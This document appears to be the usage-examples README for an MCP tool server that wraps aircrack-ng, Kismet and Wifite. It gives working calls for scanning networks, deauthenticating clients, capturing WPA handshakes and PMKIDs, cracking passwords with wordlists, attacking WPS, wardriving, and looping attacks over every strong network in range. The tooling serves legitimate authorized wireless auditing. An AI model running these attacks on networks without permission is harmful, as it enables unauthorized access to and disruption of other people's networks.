# Wireless Security MCP - Usage Examples

## Table of Contents
1. [Getting Started](#getting-started)
2. [Network Discovery](#network-discovery)
3. [Handshake Capture](#handshake-capture)
4. [Password Cracking](#password-cracking)
5. [Automated Testing](#automated-testing)
6. [Advanced Scenarios](#advanced-scenarios)

## Getting Started

### Check Tool Availability
Before starting, ensure all required tools are installed:

```bash
# Check if tools are available
which aircrack-ng airodump-ng aireplay-ng airmon-ng kismet wifite
```

### Enable Monitor Mode
Most wireless security operations require monitor mode:

```javascript
// Enable monitor mode on wlan0
await aircrack_monitor_mode({
  interface: "wlan0",
  enable: true
});
// This will create wlan0mon interface
```

## Network Discovery

### Basic Network Scanning with Aircrack-ng
```javascript
// Scan for all nearby networks
const scanResult = await aircrack_scan_networks({
  interface: "wlan0mon",
  timeout: 30  // Scan for 30 seconds
});

// scanResult contains:
// {
//   networks: [
//     {
//       bssid: "AA:BB:CC:DD:EE:FF",
//       ssid: "MyNetwork",
//       channel: 6,
//       power: -45,
//       encryption: "WPA2"
//     },
//     ...
//   ],
//   timestamp: "2024-01-01T12:00:00Z",
//   interface: "wlan0mon"
// }
```

### Comprehensive Scanning with Kismet
```javascript
// Start Kismet server first
await kismet_start_server({
  interface: "wlan0",
  port: 2501,
  logDir: "/tmp/kismet-logs"
});

// Wait a moment for server to initialize
await new Promise(resolve => setTimeout(resolve, 5000));

// Scan for networks
const networks = await kismet_scan_networks({
  timeout: 60
});

// Detect clients on all networks
const clients = await kismet_detect_clients({
  timeout: 30
});

// Or filter by specific BSSID
const specificClients = await kismet_detect_clients({
  bssid: "AA:BB:CC:DD:EE:FF",
  timeout: 30
});
```

## Handshake Capture

### Targeted Handshake Capture
```javascript
// Step 1: Scan to find target network details
const scan = await aircrack_scan_networks({
  interface: "wlan0mon",
  timeout: 20
});

// Step 2: Find your target network
const target = scan.networks.find(n => n.ssid === "TargetNetwork");

// Step 3: Capture handshake
const handshake = await aircrack_capture_handshake({
  interface: "wlan0mon",
  bssid: target.bssid,
  channel: target.channel,
  timeout: 300  // Wait up to 5 minutes
});

// Optional: Speed up handshake capture with deauth
await aircrack_deauth_client({
  interface: "wlan0mon",
  bssid: target.bssid,
  count: 3  // Send 3 deauth packets
});
```

### PMKID Capture (Clientless)
```javascript
// Modern routers may be vulnerable to PMKID capture
await wifite_capture_pmkid({
  interface: "wlan0",
  bssid: "AA:BB:CC:DD:EE:FF",
  timeout: 120
});
```

## Password Cracking

### Dictionary Attack with Aircrack-ng
```javascript
// Crack captured handshake
const result = await aircrack_crack_password({
  handshakeFile: "/tmp/handshake-AABBCCDDEEFF-01.cap",
  wordlist: "/usr/share/wordlists/rockyou.txt",
  bssid: "AA:BB:CC:DD:EE:FF"  // Optional, speeds up cracking
});
```

### Automated Cracking with Wifite
```javascript
// Wifite can automatically crack captured handshakes
await wifite_crack_handshake({
  handshakeFile: "/path/to/handshake.cap",
  wordlist: "/usr/share/wordlists/rockyou.txt"
});
```

## Automated Testing

### Full Automation with Wifite
```javascript
// Audit all networks in range
await wifite_auto_audit({
  interface: "wlan0",
  timeout: 600,      // 10 minutes
  minimumPower: -70  // Only target networks with good signal
});

// Target specific network with all attack methods
await wifite_target_network({
  interface: "wlan0",
  bssid: "AA:BB:CC:DD:EE:FF",
  attackMode: "all",  // Try all methods: WPA, WPS, WEP
  timeout: 300
});
```

### WPS Attacks
```javascript
// WPS PIN attack with Pixie-Dust
await wifite_wps_attack({
  interface: "wlan0",
  bssid: "AA:BB:CC:DD:EE:FF",
  timeout: 600,
  pixieDust: true  // Use faster Pixie-Dust attack
});
```

## Advanced Scenarios

### Complete Workflow Example
```javascript
// 1. Enable monitor mode
await aircrack_monitor_mode({
  interface: "wlan0",
  enable: true
});

// 2. Test injection capability
const injection = await aircrack_test_injection({
  interface: "wlan0mon"
});

if (!injection.success) {
  console.log("Injection not supported on this adapter!");
  return;
}

// 3. Start Kismet for comprehensive monitoring
await kismet_start_server({
  interface: "wlan0mon",
  port: 2501
});

// 4. Perform network discovery
const networks = await aircrack_scan_networks({
  interface: "wlan0mon",
  timeout: 60
});

// 5. Export Kismet data for analysis
await kismet_export_data({
  outputFile: "/tmp/network-survey.json",
  format: "json"
});

// 6. Run automated audit on interesting targets
const strongNetworks = networks.networks.filter(n => n.power > -60);
for (const network of strongNetworks) {
  await wifite_target_network({
    interface: "wlan0mon",
    bssid: network.bssid,
    attackMode: "wpa",
    timeout: 180
  });
}
```

### Session Management
```javascript
// Save current session
await wifite_session_management({
  action: "save",
  sessionName: "office-audit-2024"
});

// List saved sessions
await wifite_session_management({
  action: "list"
});

// Resume previous session
await wifite_session_management({
  action: "resume",
  sessionName: "office-audit-2024"
});
```

### Channel-Specific Monitoring
```javascript
// Monitor specific channel with Kismet
await kismet_monitor_channel({
  interface: "wlan0mon",
  channel: 6
});

// Export captured data in PCAP format
await kismet_export_data({
  outputFile: "/tmp/channel6-capture.pcap",
  format: "pcap"
});
```

### GPS-Enabled Wardriving
```javascript
// Enable GPS tracking for network mapping
await kismet_gps_tracking({
  enable: true,
  device: "/dev/ttyUSB0"  // GPS device
});

// Scan networks with location data
await kismet_scan_networks({
  timeout: 300  // 5 minute scan
});

// Export with GPS data
await kismet_export_data({
  outputFile: "/tmp/wardriving-data.json",
  format: "json"
});
```

## Best Practices

1. **Always check tool availability** before running operations
2. **Use appropriate timeouts** - longer for handshake capture, shorter for scanning
3. **Monitor signal strength** - target networks with good signal for better results
4. **Save sessions** when doing long audits to resume if interrupted
5. **Export and analyze data** offline for better insights
6. **Clean up** - disable monitor mode when done:
   ```javascript
   await aircrack_monitor_mode({
     interface: "wlan0mon",
     enable: false
   });
   ```

## Troubleshooting Tips

1. If monitor mode fails, kill conflicting processes:
   ```bash
   sudo airmon-ng check kill
   ```

2. If Kismet server won't start, check if port is in use:
   ```bash
   sudo lsof -i :2501
   ```

3. For injection test failures, try different drivers or adapters

4. If Wifite fails, ensure all dependencies are installed:
   ```bash
   wifite --requirements
   ```

Remember: Always ensure you have explicit permission before testing any network!